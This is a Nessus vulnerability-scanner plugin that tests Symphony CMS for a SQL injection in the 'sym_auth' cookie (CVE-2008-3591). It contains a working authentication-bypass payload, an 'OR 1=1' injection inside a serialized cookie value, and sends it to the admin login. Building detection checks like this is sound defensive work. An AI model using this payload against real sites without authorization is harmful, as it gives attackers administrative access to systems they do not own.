#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(33811);
  script_version("$Revision: 1.21 $");
  script_cvs_date("$Date: 2016/05/19 18:02:20 $");

  script_cve_id("CVE-2008-3591");
  script_bugtraq_id(30477);
  script_osvdb_id(47323);
  script_xref(name:"EDB-ID", value:"6177");
  script_xref(name:"Secunia", value:"31293");

  script_name(english:"Symphony sym_auth Cookie SQL Injection");
  script_summary(english:"Attempts to bypass admin login");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack.");
  script_set_attribute(attribute:"description", value:
"The version of Symphony installed on the remote host fails to
sanitize user-supplied input to the 'sym_auth' cookie before using it
in the 'login' function in 'lib/class.admin.php' in a database query.
An unauthenticated attacker may be able to exploit this issue to
manipulate database queries to bypass authentication and gain
administrative access, disclose sensitive information, attack the
underlying database, etc.

Note that the application also reportedly allows an attacker with
admin access to upload arbitrary files and then execute them; however,
Nessus has not actually tested for this issue." );
  script_set_attribute(attribute:"solution", value:"Upgrade to Symphony 1.7.01 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(89);

  script_set_attribute(attribute:"plugin_publication_date", value:"2008/08/04");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:symphony-cms:symphony_cms");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("symphony_cms_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP", "www/symphony");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

port = get_http_port(default:80,php:TRUE);

install = get_install_from_kb(appname:'symphony', port:port,exit_on_fail:TRUE);
dir = install['dir'];

# Define some variables.
user = SCRIPT_NAME;
pass = "nessus' OR 1=1 LIMIT 1 -- ";
id = 1;
exploit = string(
  'a:3:{',
    's:8:"username";s:', strlen(user), ':"', user, '";',
    's:8:"password";s:', strlen(pass), ':"', pass, '";',
    's:2:"id";i:1;',
  '}'
);

# Try to exploit the issue.
url = string(dir, "/symphony/");
val = get_http_cookie(name: "sym_auth_safe");
if (! isnull(val)) clear_cookiejar();
set_http_cookie(name: "sym_auth", value: urlencode(str:exploit));
r = http_send_recv3(method: "GET", item:url, port:port, exit_on_fail:TRUE);

# There's a problem if we appear to be logged in now.
val = get_http_cookie(name: "sym_auth_safe");
if (
   #    egrep(pattern:'^Set-Cookie: .*sym_auth_safe=[A-Za-z0-9%]', string:r[1]) &&
   ! isnull(val) &&
   egrep(pattern:'^Location: .*/symphony/\\?page=', string:r[1])
)
{
  if (report_verbosity)
  {
    report = string(
      "\n",
      "Nessus was able to bypass authentication and gain administrative\n",
      "access using the following URL :\n",
      "\n",
      "  ", build_url(port:port, qs:url), "\n",
      "\n",
      "along with the following session cookie :\n",
      "\n",
      "  sym_auth=", urlencode(str:exploit), "\n"
    );
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else exit(0, "The Symphony install at " +  build_url(qs:dir+'/index.php', port:port) + " is not affected.");
